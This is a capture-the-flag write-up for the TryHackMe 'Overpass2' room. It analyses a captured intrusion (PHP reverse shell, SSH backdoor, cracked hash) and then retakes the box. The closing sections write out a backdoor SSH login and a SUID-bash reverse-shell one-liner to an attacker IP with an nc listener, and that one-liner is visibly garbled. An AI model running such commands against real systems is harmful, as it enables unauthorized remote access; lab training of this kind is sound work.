# [Overpass2](https://tryhackme.com/room/overpass2hacked)

# Initial Access

![image](../../images/ove-1_clean.png)

Attacker first foot hold was from private IP address `192.168.170.145` , he requested `/development`page which it allow to POST requests.

![image](../../images/ove-2_clean.png)

Attacker upload payload with name `Upload.php` then he goes to exposed upload page to active the payload.
## Payload
![image](../../images/ove-3_clean.png)

Attacker used simple PHP reverse shell. 

Following TCP stream for attacker after he gained foot hold we found we used password

![image](../../images/ove-4_clean.png)

to gain access to user called James .

Attacker also used SSH backdoor to be consistency have access to compromised system.

![image](../../images/ove-5_clean.png)

Crackable system passwords.

![image](../../images/ove-6_clean.png)

---
# Analyzing backdoor code

download source code for this backdoor and open it to find hash used in it.
![image](../../images/ove-7_clean.png)

salt for backdoor
![image](../../images/ove-8_clean.png)

**Hash Attacker used for backdoor**

![image](../../images/ove-9_clean.png)

**Cracking hash**
`november16`

---

# Return our control back
Connect to machine with port specified in back door code. and with hashed password inside backdoor code too `november16`

```
ssh -p 2222 10.130.170.178
```

**user flag** 

![image](../../images/ove-10_clean.png)

# Privilege escalation

![image](../../images/ove-11_clean.png)

Searching for SUDO bits files we found this bash with SUID bit valid.
 
 using this command on target machine to create *reverse shell* with this SUID bit bash
 ```
 ./.suid_bash -p -c 'exec bash -p -i &v/tcp/10.130.91.156/4444 <&1'
 ```
 
 ```
 attacker$ nc -lnvp 4444
 ```

**Rooted** ✅

 ![image](../../images/ove-12_clean.png)
 
 



